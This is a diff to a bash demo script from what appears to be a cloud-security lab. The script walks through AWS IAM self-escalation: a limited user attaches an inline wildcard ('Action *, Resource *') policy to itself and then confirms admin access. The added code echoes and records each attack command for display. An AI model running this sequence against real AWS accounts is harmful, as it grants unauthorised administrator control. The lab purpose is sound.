@@ -3,7 +3,6 @@
 # Demo script for iam:PutUserPolicy privilege escalation
 # This is a USER-BASED self-escalation scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-007-to-admin-starting-user"
@@ -51,6 +68,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -63,6 +81,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 # Step 3: Test current permissions (should be limited)
 echo -e "${YELLOW}Step 3: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
     echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
@@ -89,6 +108,7 @@ EOF
 )
 
 # Attach the inline policy to self
+show_attack_cmd "aws iam put-user-policy --user-name $STARTING_USER --policy-name $INLINE_POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-user-policy \
     --user-name $STARTING_USER \
     --policy-name $INLINE_POLICY_NAME \
@@ -104,10 +124,12 @@ echo ""
 # Step 5: Verify admin access
 echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
+show_cmd "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
+show_cmd "aws s3 ls"
 aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
@@ -123,5 +145,17 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (PutUserPolicy on self) → Admin"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+    echo ""
+fi
+
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the inline policy${NC}"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
